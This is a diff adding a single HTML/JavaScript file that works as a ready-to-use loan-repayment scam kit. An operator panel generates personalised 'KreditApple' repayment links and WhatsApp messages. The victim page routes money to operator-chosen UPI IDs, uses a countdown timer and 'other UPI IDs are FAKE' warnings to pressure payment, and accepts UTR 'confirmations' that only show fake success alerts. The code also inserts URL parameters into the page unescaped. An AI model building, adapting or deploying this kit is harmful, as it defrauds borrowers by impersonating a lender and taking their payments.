@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Order Details - KreditApple</title>
+<script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex justify-center items-center min-h-screen m-0">
+
+<div class="w-full max-w-md bg-white shadow-xl min-h-screen flex flex-col justify-between pb-6" id="app"></div>
+
+<script>
+const p = new URLSearchParams(window.location.search);
+const d = {
+  biz: p.get('b') || p.get('biz'),
+  logo: p.get('l') || p.get('logo') || 'K',
+  name: p.get('n') || p.get('name') || 'Customer',
+  mobile: p.get('m') || p.get('mobile') || '+91 7500000058',
+  days: p.get('d') || p.get('days') || '0 Days left',
+  date: p.get('dt') || p.get('date') || '2026-11-20',
+  ext: p.get('e') || p.get('ext') || '2400',
+  full: p.get('f') || p.get('full') || '6000',
+  upi1: p.get('u1') || p.get('upi1') || 'bharatpe.90065511470@fbpe',
+  upi2: p.get('u2') || p.get('upi2') || '',
+  upi3: p.get('u3') || p.get('upi3') || '',
+  upi4: p.get('u4') || p.get('upi4') || '',
+  upi5: p.get('u5') || p.get('upi5') || ''
+};
+
+const app = document.getElementById('app');
+let sel = parseInt(p.get('ch') || '1');
+let page = p.get('page') || 'home';
+let mode = p.get('mode') || 'repay';
+let partAmt = 5000;
+let timerInterval = null;
+
+function getUpis(){
+  return [d.upi1||'', d.upi2||'', d.upi3||'', d.upi4||'', d.upi5||''];
+}
+
+function goPay(m){
+  const u = new URL(window.location.href);
+  u.searchParams.set('page', 'pay');
+  u.searchParams.set('mode', m);
+  u.searchParams.set('ch', sel);
+  window.location.href = u.toString();
+}
+
+function goHome(){
+  if(timerInterval) clearInterval(timerInterval);
+  const u = new URL(window.location.href);
+  u.searchParams.delete('page');
+  u.searchParams.delete('mode');
+  window.location.href = u.toString();
+}
+
+function startTimer(durationSeconds) {
+  if(timerInterval) clearInterval(timerInterval);
+  let timer = durationSeconds;
+  const display = document.getElementById('countdownTimer');
+  if(!display) return;
+
+  timerInterval = setInterval(function () {
+    let minutes = parseInt(timer / 60, 10);
+    let seconds = parseInt(timer % 60, 10);
+
+    seconds = seconds < 10 ? "0" + seconds : seconds;
+    display.textContent = minutes + " : " + seconds;
+
+    if (--timer < 0) {
+      clearInterval(timerInterval);
+      display.textContent = "0 : 00";
+    }
+  }, 1000);
+}
+
+function copyUpiId(upiText, btnEl) {
+  navigator.clipboard.writeText(upiText);
+  const originalText = btnEl.innerText;
+  btnEl.innerText = 'COPIED';
+  btnEl.style.backgroundColor = '#16a34a';
+  setTimeout(() => {
+    btnEl.innerText = originalText;
+    btnEl.style.backgroundColor = '#2563eb';
+  }, 2000);
+}
+
+function submitPayUtr() {
+  const utrVal = document.getElementById('payUtrInput').value.trim();
+  if(!utrVal || utrVal.length < 12) {
+    alert('Please enter a valid 12-digit UTR / Ref No.');
+    document.getElementById('payUtrInput').focus();
+    return;
+  }
+  alert('UTR (' + utrVal + ') submitted successfully! Verification in progress.');
+}
+
+function renderApp(){
+  if(!d.biz){
+    app.innerHTML = `
+      <div class="bg-[#2196F3] text-white px-4 py-4 text-center font-bold text-base shadow">Admin Panel - Link Generator</div>
+      <div class="p-4 space-y-3 overflow-y-auto">
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="text-xs font-bold block text-gray-700">Business Name</label>
+            <input id="biz" value="KreditApple" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+          </div>
+          <div>
+            <label class="text-xs font-bold block text-gray-700">Logo Image URL / Letter</label>
+            <input id="logo" value="K" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+          </div>
+        </div>
+        
+        <label class="text-xs font-bold block text-gray-700">Customer Name</label>
+        <input id="name" placeholder="Ahmed Khan" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <label class="text-xs font-bold block text-gray-700">Customer Account / Number</label>
+        <input id="mobile" value="+91 7500000058" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="text-xs font-bold block text-gray-700">Waiting Text / Days</label>
+            <input id="days" value="0 Days left" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+          </div>
+          <div>
+            <label class="text-xs font-bold block text-gray-700">Repayment Date</label>
+            <input id="date" type="date" value="2026-11-20" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+          </div>
+        </div>
+        
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="text-xs font-bold block text-gray-700">Extension (₹)</label>
+            <input id="ext" type="number" value="2400" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+          </div>
+          <div>
+            <label class="text-xs font-bold block text-gray-700">Full Repay (₹)</label>
+            <input id="full" type="number" value="6000" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+          </div>
+        </div>
+
+        <label class="text-xs font-bold block text-gray-700">Channel 1 UPI (Required)</label>
+        <input id="upi1" value="bharatpe.90065511470@fbpe" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <label class="text-xs font-bold block text-gray-700">Channel 2 UPI (Optional)</label>
+        <input id="upi2" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <label class="text-xs font-bold block text-gray-700">Channel 3 UPI (Optional)</label>
+        <input id="upi3" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <label class="text-xs font-bold block text-gray-700">Channel 4 UPI (Optional)</label>
+        <input id="upi4" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <label class="text-xs font-bold block text-gray-700">Channel 5 UPI (Optional)</label>
+        <input id="upi5" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        
+        <button onclick="makeLink()" class="w-full bg-[#0083b0] text-white py-3 rounded-full font-bold mt-3 shadow hover:bg-[#006e94]">Generate Short Link</button>
+        <div id="out"></div>
+      </div>`;
+    return;
+  }
+
+  const list = getUpis();
+  const avail = list.map((u, i) => u ? i + 1 : null).filter(x => x !== null);
+  if(!avail.includes(sel)) sel = avail[0] || 1;
+
+  if(page !== 'pay'){
+    let channelsHtml = '';
+    for(let i = 1; i <= 5; i++){
+      let isActive = (sel === i);
+      let hasUpi = list[i-1] ? true : false;
+      let bgClass = isActive ? 'bg-[#3498db] text-white shadow-sm' : (hasUpi ? 'bg-gray-200 text-gray-700' : 'bg-gray-200 text-gray-400');
+      channelsHtml += `<button onclick="sel=${i};renderApp()" class="${bgClass} font-semibold py-3 rounded-xl text-xs transition">Channel ${i}</button>`;
+    }
+
+    let logoContent = '';
+    if(d.logo.startsWith('http://') || d.logo.startsWith('https://') || d.logo.startsWith('data:image/')) {
+      logoContent = `<img src="${d.logo}" class="w-full h-full object-cover rounded-xl" alt="Logo">`;
+    } else {
+      logoContent = `<span class="text-xl">${d.logo}</span>`;
+    }
+
+    app.innerHTML = `
+      <div class="flex flex-col min-h-screen justify-between">
+        <div>
+          <div class="bg-[#2196F3] text-white px-4 py-3 flex justify-between items-center text-sm font-medium">
+            <span>Order Details</span>
+            <a href="#" class="hover:underline">Go borrow money >></a>
+          </div>
+
+          <div class="p-4 space-y-4">
+            <div class="flex items-center justify-between border-b pb-3">
+              <div class="flex items-center space-x-3">
+                <div class="bg-[#1e3d30] p-1 rounded-xl text-white font-bold flex flex-col items-center justify-center w-12 h-12 overflow-hidden">
+                  ${logoContent}
+                </div>
+                <div>
+                  <h2 class="font-bold text-gray-800 text-sm">${d.biz} -</h2>
+                  <p class="text-xs text-gray-600">${d.biz}</p>
+                </div>
+              </div>
+              <span class="font-bold text-gray-900 text-sm">${d.days}</span>
+            </div>
+
+            <div class="text-[13px] space-y-2 border-b pb-3">
+              <div class="flex justify-between text-gray-400">
+                <span>Account</span>
+                <span class="text-gray-800 font-medium">${d.mobile}</span>
+              </div>
+              <div class="flex justify-between text-gray-400">
+                <span>Amount You Repay</span>
+                <span class="text-gray-900 font-bold">₹${Number(d.full).toLocaleString('en-IN')}</span>
+              </div>
+              <div class="flex justify-between text-gray-400">
+                <span>Repayment Date</span>
+                <span class="text-gray-900 font-medium">${d.date}</span>
+              </div>
+            </div>
+
+            <div class="text-[11px] text-red-600 font-bold leading-tight bg-red-50 p-2 rounded border border-red-100">
+              !!!Do <span class="text-red-700 underline">NOT</span> save UPI, UPI will change in real time!!!<br>
+              !!!The UPI sent to you privately is <span class="text-red-700">FAKE</span> and will NOT be updated!!!
+            </div>
+
+            <div class="grid grid-cols-2 gap-3">
+              <button onclick="goPay('repay')" class="bg-[#0083b0] text-white py-3 px-2 rounded-full font-bold text-sm shadow hover:bg-[#006e94] transition text-center">
+                Repay ₹${Number(d.full).toLocaleString('en-IN')}
+              </button>
+              <button onclick="goPay('extension')" class="bg-[#26c6da] text-white py-3 px-2 rounded-full font-bold text-sm shadow hover:bg-[#22b2c4] transition text-center leading-tight flex flex-col justify-center">
+                <span>7 days extension</span>
+                <span class="text-xs">₹${Number(d.ext).toLocaleString('en-IN')}</span>
+              </button>
+            </div>
+
+            <div class="space-y-2 pt-1">
+              <label class="text-xs font-semibold text-gray-800">Part Repayment/₹</label>
+              <div class="flex items-center space-x-2">
+                <div class="flex items-center justify-between border rounded-full px-3 py-1.5 bg-white shadow-sm w-44 shrink-0">
+                  <button onclick="decreasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-500 flex items-center justify-center font-bold text-lg hover:bg-blue-50">-</button>
+                  <span id="partAmount" class="font-semibold text-gray-700 text-sm px-2">${partAmt}</span>
+                  <button onclick="increasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-500 flex items-center justify-center font-bold text-lg hover:bg-blue-50">+</button>
+                </div>
+                <button onclick="goPay('repay')" class="flex-1 bg-[#0083b0] text-white py-3 px-2 rounded-full font-bold text-sm shadow hover:bg-[#006e94] transition text-center truncate">
+                  Repay ₹<span id="btnPartText">${partAmt}</span>
+                </button>
+              </div>
+              <p class="text-[11px] text-red-500 font-medium text-center">Repayment amount must match entered amount to be credited.</p>
+            </div>
+
+            <div class="space-y-2 pt-2">
+              <label class="text-xs font-semibold text-gray-800">Repayment Channel</label>
+              <div class="grid grid-cols-3 gap-2">
+                ${channelsHtml}
+              </div>
+            </div>
+
+            <div class="space-y-3 pt-2">
+              <label class="text-xs font-semibold text-gray-800">Aready Paid?</label>
+              <div class="space-y-2 text-xs">
+                <div class="flex items-center border-b pb-2">
+                  <span class="w-24 text-gray-600">Amount</span>
+                  <input type="text" id="confAmount" placeholder="Input Amount" class="w-full focus:outline-none text-gray-700 placeholder-gray-300">
+                </div>
+                <div class="flex items-center border-b pb-2">
+                  <span class="w-24 text-gray-600">UTR</span>
+                  <input type="text" id="confUtr" placeholder="Input UTR" class="w-full focus:outline-none text-gray-700 placeholder-gray-300">
+                </div>
+                <div class="flex items-center border-b pb-2">
+                  <span class="w-24 text-gray-600">UPI</span>
+                  <input type="text" id="confUpi" placeholder="Input UPI(optional)" class="w-full focus:outline-none text-gray-700 placeholder-gray-300">
+                </div>
+                <div class="flex items-center justify-between pt-1">
+                  <span class="text-gray-600">Screenshot</span>
+                  <div class="w-16 h-16 border-2 border-dashed border-gray-200 rounded-lg flex items-center justify-center bg-gray-50 cursor-pointer relative overflow-hidden">
+                    <input type="file" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" onchange="previewImg(this)">
+                    <svg id="camIcon" class="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                    <span id="imgUploaded" class="text-[10px] text-green-600 font-bold hidden">Added</span>
+                  </div>
+                </div>
+              </div>
+              <button onclick="submitConfirm()" class="w-full bg-[#90caf9] text-white py-3 rounded-full font-bold text-sm shadow-sm mt-4 hover:bg-blue-400 transition">
+                Confirm
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="px-4 mt-6">
+          <div class="bg-gradient-to-r from-[#ff7043] to-[#f4511e] rounded-2xl p-3 flex items-center justify-between text-white shadow-md">
+            <div class="flex items-center space-x-2">
+              <div class="bg-[#1e3d30] p-1.5 rounded-lg text-white font-bold flex flex-col items-center justify-center w-10 h-10 overflow-hidden">
+                ${d.logo.startsWith('http') ? `<img src="${d.logo}" class="w-full h-full object-cover">` : `<span class="text-sm">${d.logo}</span>`}
+              </div>
+              <div>
+                <h4 class="font-extrabold text-sm leading-tight">Easy Loans</h4>
+                <p class="text-[10px] bg-white/20 px-1.5 py-0.5 rounded inline-block mt-0.5">Just a Download Away</p>
+              </div>
+            </div>
+            <button class="bg-[#ffe082] text-orange-900 font-extrabold px-5 py-2 rounded-full shadow hover:bg-amber-200 transition text-sm">
+              GO
+            </button>
+          </div>
+        </div>
+      </div>
+    `;
+  } else {
+    const isRepay = (mode === 'repay');
+    const amt = isRepay ? d.full : d.ext;
+    const formattedAmt = Number(amt).toFixed(2);
+    const upi = list[sel-1] || d.upi1;
+    const title = isRepay ? 'Full Repayment' : 'Extension Payment';
+    
+    const upiParams = `pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(d.biz)}&am=${formattedAmt}&cu=INR&tn=${encodeURIComponent(title+' '+d.name)}`;
+    const upiLink = `upi://pay?${upiParams}`;
+    const paytmLink = `paytmmp://pay?${upiParams}`;
+    const phonepeLink = `phonepe://pay?${upiParams}`;
+    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;
+
+    app.innerHTML = `
+      <div class="flex flex-col min-h-screen bg-white">
+        <div class="bg-[#5b1d99] text-white py-3 px-4 flex items-center justify-center space-x-2 font-semibold text-lg shadow-sm">
+          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="display:inline-block;vertical-align:middle;">
+            <circle cx="12" cy="12" r="9"></circle>
+            <polyline points="12 7 12 12 15 14"></polyline>
+          </svg>
+          <span id="countdownTimer" class="tracking-wider">7 : 45</span>
+        </div>
+
+        <div class="p-4 flex-1 flex flex-col">
+          <div class="text-center mt-1">
+            <p class="text-gray-700 text-sm font-medium">Amount payable</p>
+            <div class="text-[#5b1d99] text-4xl font-extrabold mt-1 tracking-tight">₹ ${formattedAmt}</div>
+            <p class="text-gray-700 text-sm font-medium mt-3">Use Mobile Scan code to pay</p>
+          </div>
+
+          <div class="my-4 flex justify-center">
+            <img src="${qr}" alt="Payment QR Code" class="w-48 h-48 object-contain">
+          </div>
+
+          <div class="mt-1">
+            <p class="text-gray-800 text-sm font-medium mb-2.5">Choose a payment method to pay</p>
+            <div class="grid grid-cols-2 gap-3">
+              <a href="${paytmLink}" onclick="setTimeout(()=>{window.location.href='${upiLink}'}, 600)" class="flex items-center space-x-3 border border-gray-200 rounded-lg px-3 py-2.5 shadow-sm hover:border-blue-400 transition bg-white">
+                <span class="font-black text-lg tracking-tighter leading-none">
+                  <span class="text-[#002970]">pay</span><span class="text-[#00baf2]">tm</span>
+                </span>
+                <span class="text-gray-800 font-medium text-sm">Paytm</span>
+              </a>
+
+              <a href="${phonepeLink}" onclick="setTimeout(()=>{window.location.href='${upiLink}'}, 600)" class="flex items-center space-x-2.5 border border-gray-200 rounded-lg px-3 py-2.5 shadow-sm hover:border-purple-400 transition bg-white">
+                <div class="w-7 h-7 rounded-full bg-[#5f259f] text-white flex items-center justify-center font-bold text-base shrink-0">
+                  पे
+                </div>
+                <span class="text-gray-800 font-medium text-sm">PhonePe</span>
+              </a>
+            </div>
+          </div>
+
+          <div class="mt-5">
+            <p class="text-gray-800 text-sm font-medium mb-2">Manual transfer(Copy the below given UPI ID)</p>
+            <div class="flex items-center border border-gray-200 rounded-md overflow-hidden shadow-sm">
+              <div class="flex-1 px-3 py-2.5 text-gray-800 font-medium text-sm bg-white truncate select-all">${upi}</div>
+              <button onclick="copyUpiId('${upi}', this)" class="bg-[#2563eb] hover:bg-blue-700 text-white font-semibold text-xs px-5 py-3 tracking-wide transition shrink-0">
+                COPY
+              </button>
+            </div>
+            <p class="text-[#d97706] text-xs font-medium mt-2">Tip: Don't save the UPI, get new UPI every time.</p>
+          </div>
+
+          <div class="mt-4">
+            <p class="text-[#dc2626] text-sm font-bold mb-2">Need to enter your 12 Ref No. (UTR)</p>
+            <div class="flex items-center border border-gray-200 rounded-md px-3 py-2.5 bg-gray-50/50 focus-within:border-blue-500 focus-within:bg-white transition">
+              <span class="text-red-500 font-bold mr-1">*</span>
+              <span class="text-gray-800 font-semibold text-sm mr-2">UTR</span>
+              <input type="text" id="payUtrInput" maxlength="12" inputmode="numeric" placeholder="UTR is required" class="w-full text-sm text-gray-800 placeholder-gray-400 bg-transparent focus:outline-none">
+            </div>
+            <p class="text-[#d97706] text-xs font-medium mt-2 leading-relaxed">
+              Tip: Open your UPI wallet and complete the transfer Record your reference No.(Ref No.) after payment.
+            </p>
+          </div>
+
+          <div class="mt-5">
+            <button onclick="submitPayUtr()" class="w-full bg-[#2563eb] hover:bg-blue-700 text-white font-semibold py-3 rounded-full text-base shadow transition">
+              Submit UTR
+            </button>
+          </div>
+
+          <div class="mt-4 text-center">
+            <button onclick="goHome()" class="text-xs text-gray-400 hover:text-gray-600 underline">
+              Back to Details
+            </button>
+          </div>
+        </div>
+      </div>
+    `;
+
+    setTimeout(() => startTimer(465), 100);
+  }
+}
+
+function increasePart(){
+  partAmt += 500;
+  document.getElementById('partAmount').innerText = partAmt;
+  document.getElementById('btnPartText').innerText = partAmt;
+}
+function decreasePart(){
+  if(partAmt > 500){
+    partAmt -= 500;
+    document.getElementById('partAmount').innerText = partAmt;
+    document.getElementById('btnPartText').innerText = partAmt;
+  }
+}
+function previewImg(input){
+  if(input.files && input.files[0]){
+    document.getElementById('camIcon').style.display = 'none';
+    document.getElementById('imgUploaded').style.display = 'block';
+  }
+}
+function submitConfirm(){
+  const utr = document.getElementById('confUtr').value;
+  if(!utr){
+    alert('Please enter UTR / Transaction ID');
+  } else {
+    alert('Payment confirmation submitted successfully!');
+  }
+}
+
+function makeLink(){
+  const b = document.getElementById('biz').value || 'KreditApple';
+  const l = document.getElementById('logo').value || 'K';
+  const n = document.getElementById('name').value || 'Customer';
+  const m = document.getElementById('mobile').value || '+91 7500000058';
+  const ds = document.getElementById('days').value || '0 Days left';
+  const dt = document.getElementById('date').value || '2026-11-20';
+  const e = document.getElementById('ext').value || '2400';
+  const f = document.getElementById('full').value || '6000';
+  const u1 = document.getElementById('upi1').value;
+  const u2 = document.getElementById('upi2').value;
+  const u3 = document.getElementById('upi3').value;
+  const u4 = document.getElementById('upi4').value;
+  const u5 = document.getElementById('upi5').value;
+
+  if(!u1){ alert('Channel 1 UPI is required'); return; }
+
+  let link = window.location.origin + window.location.pathname + `?b=${encodeURIComponent(b)}&l=${encodeURIComponent(l)}&n=${encodeURIComponent(n)}&m=${encodeURIComponent(m)}&d=${encodeURIComponent(ds)}&dt=${dt}&e=${e}&f=${f}&u1=${encodeURIComponent(u1)}`;
+  if(u2) link += `&u2=${encodeURIComponent(u2)}`;
+  if(u3) link += `&u3=${encodeURIComponent(u3)}`;
+  if(u4) link += `&u4=${encodeURIComponent(u4)}`;
+  if(u5) link += `&u5=${encodeURIComponent(u5)}`;
+
+  const msg = `Hello ${n}, your ${b} repayment link: ${link}`;
+  
+  document.getElementById('out').innerHTML = `
+    <div class="bg-orange-50 border border-orange-200 p-3 rounded-lg mt-3 break-all text-xs text-gray-700">${link}</div>
+    <button class="w-full bg-[#0083b0] text-white py-3 rounded-full font-bold mt-2 shadow" onclick="navigator.clipboard.writeText('${link}');alert('Link Copied!')">Copy Link</button>
+    <a href="https://wa.me/${m.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(msg)}" target="_blank" class="block text-center bg-[#25D366] text-white py-3 rounded-full font-bold mt-2 shadow">Send on WhatsApp</a>
+  `;
+}
+
+renderApp();
+</script>
+</body>
+</html>
